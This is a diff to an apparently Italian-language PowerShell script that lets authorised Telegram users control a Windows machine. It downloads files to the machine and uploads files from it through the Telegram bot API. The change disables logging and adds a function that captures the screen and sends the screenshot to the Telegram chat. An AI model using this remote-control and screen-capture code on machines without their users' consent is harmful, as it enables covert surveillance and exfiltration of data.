@@ -10,7 +10,7 @@ $api_send_messages  = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_toke
 $api_get_file       = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
 $api_download_file  = 'https://api.telegram.org/file/bot{0}/' -f $api_token
 $api_upload_file    = 'https://api.telegram.org/bot{0}/sendDocument?chat_id={1}' -f $api_token, $telegram_id
-$logs = $true
+$logs = $false
 $Global:ProgressPreference = 'SilentlyContinue'
 
 
@@ -36,7 +36,27 @@ function CheckAdminRights()
 }
 
 
-function DownloadDocument ($file_id, $file_name)
+function GetScreenshot {
+    try {
+        SendMessage "Procedo a catturare la schermata..."
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap.Size)
+        $outputPath = Join-Path $env:userprofile "screen.png"
+        $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        $bitmap.Dispose()
+        $graphics.Dispose()
+        SendMessage "Procedo ad inviare lo screenshot..."
+        SendFile $outputPath
+    }
+    catch {
+        SendMessage $Error[0]
+    }
+}
+
+
+function DownloadFile($file_id, $file_name)
 {
     Log "Procedo a recuperare le informazioni del file da scaricare"
     $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id) -WebSession $session
@@ -54,7 +74,7 @@ function DownloadDocument ($file_id, $file_name)
 }
 
 
-function SendDocument($filePath) 
+function SendFile($filePath) 
 {
     SendMessage "Procedo ad inviare il file [$($filePath)]"
     if (Test-Path -Path $filePath -PathType Leaf) {
@@ -70,7 +90,8 @@ function SendDocument($filePath)
     }
 }
 
-function SendMessage ($output)
+
+function SendMessage($output)
 {
     Log "Procedo ad inviare il messaggio"
 
@@ -164,7 +185,7 @@ function CommandListener
                             if ($document) {
                                 $file_id   = $document.file_id
                                 $file_name = $document.file_name
-                                DownloadDocument $file_id $file_name
+                                DownloadFile $file_id $file_name
                             }
                         } else {
                             $unauth_user_found = ("Unauthorized user found! " + $user_id)
